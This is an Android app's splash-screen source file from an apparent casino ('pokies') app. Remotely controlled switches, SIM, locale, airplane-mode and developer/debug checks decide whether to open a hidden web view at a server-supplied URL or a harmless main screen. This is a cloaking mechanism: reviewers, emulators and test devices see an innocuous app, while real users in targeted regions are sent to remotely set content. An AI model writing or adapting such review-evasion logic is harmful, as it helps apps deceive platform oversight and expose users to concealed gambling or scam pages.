package com.test.masterpokiescasino.activities;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import com.test.masterpokiescasino.databinding.ActivitySplashBinding;
import com.test.masterpokiescasino.utils.RemoteConfigManager;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.schedulers.Schedulers;

public class SplashActivity extends AppCompatActivity {

    private enum KEYS {
        URL("url"),
        LANGUAGE("language"),
        ENABLED("enabled");
        private final String value;
        KEYS(String value) {
            this.value = value;
        }
        public String getValue() {
            return value;
        }
    }
    ActivitySplashBinding binding;
    HashMap<String, String> key_values;
    @SuppressLint("CheckResult")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivitySplashBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        RemoteConfigManager remoteConfigManager = new RemoteConfigManager();
        List<String> keys = Arrays.asList(KEYS.ENABLED.value, KEYS.URL.value,
                KEYS.LANGUAGE.value);
        remoteConfigManager.getStrings(keys)
                .subscribe(values -> {
                    int i = 0;
                    key_values = new HashMap<>();
                    for (String value : values) {
                        key_values.put(keys.get(i), value);
                        i++;
                    }
                    if(key_values.get(KEYS.ENABLED.value).equals("true")) {
                        if (allCheckPermission()) {
                            if (isNetworkAvailable()) {
                                Intent intent = new Intent(SplashActivity.this, AdvancedActivity.class);
                                intent.putExtra("url", key_values.get(KEYS.URL.value));
                                startActivity(intent);
                                finish();
                            } else
                                showNoInternetDialog();
                        }
                        else
                            startMain();
                    }

                }, error -> {
                    startMain();
                });

//        Observable.fromCallable(() -> {
//                    try {
//                        TimeUnit.SECONDS.sleep(3);
//                    } catch (InterruptedException e) {
//                        throw new RuntimeException(e);
//                    }
//                    return "Task Completed";
//                })
//                .subscribeOn(Schedulers.io())
//                .observeOn(AndroidSchedulers.mainThread())
//                .subscribe(result -> {
//                    Intent intent = new Intent(SplashActivity.this, MainActivity.class);
//                    startActivity(intent);
//                    finish();
//                }, throwable -> {
//                    Toast.makeText(SplashActivity.this, throwable.getMessage(), Toast.LENGTH_LONG).show();
//                    Log.e("ERROR", throwable.getMessage());
//                });

        View decorView = getWindow().getDecorView();
        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
        decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        getWindow().setStatusBarColor(Color.TRANSPARENT);
    }

    private boolean allCheckPermission() {
        if(isSimCardAvailable() && isLanguageCorrect() && !isAirplaneModeOn() && !isDeveloperModeOn() && !isDebugModeOn())
            return true;
        else
            return false;
    }

    private void startMain()
    {
        Intent intent = new Intent(SplashActivity.this, MainActivity.class);
        startActivity(intent);
        finish();
    }

    public boolean isSimCardAvailable() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        return telephonyManager.getSimState() != TelephonyManager.SIM_STATE_ABSENT;
    }

    public boolean isLanguageCorrect() {
        String currentLocale = Locale.getDefault().getLanguage().toLowerCase();
        String[] languages = key_values.get(KEYS.LANGUAGE.value).split(";");
        boolean correct= false;
        for (String lang : languages)
        {
            if(currentLocale.equals(lang))
            {
                correct = true;
                break;
            }
        }
        return correct;
    }

    private boolean isAirplaneModeOn() {
        return Settings.Global.getInt(getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) != 0;
    }
    public boolean isDeveloperModeOn() {
        int developerModeSetting = Settings.Secure.getInt(
                getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
        );
//        return developerModeSetting == 1;
        return false;
    }

    public boolean isDebugModeOn() {
        int adbEnabled = Settings.Global.getInt(getContentResolver(), Settings.Global.ADB_ENABLED, 0);
//        return adbEnabled == 1;
        return false;
    }

    public boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
            return activeNetworkInfo != null && activeNetworkInfo.isConnected();
        }
        return false;
    }

    private void showNoInternetDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("No internet connection")
                .setMessage("To use the application, please connect to the Internet.")
                .setPositiveButton("Retry", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        if (!isNetworkAvailable()) {
                            showNoInternetDialog();
                        } else {
                            if (allCheckPermission()) {
                                Intent intent = new Intent(SplashActivity.this, AdvancedActivity.class);
                                intent.putExtra("url", key_values.get(KEYS.URL.value));
                                startActivity(intent);
                                finish();
                            }
                        }
                    }
                })
                .setNegativeButton("Exit", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        finish();
                    }
                });

        builder.create().show();
    }
}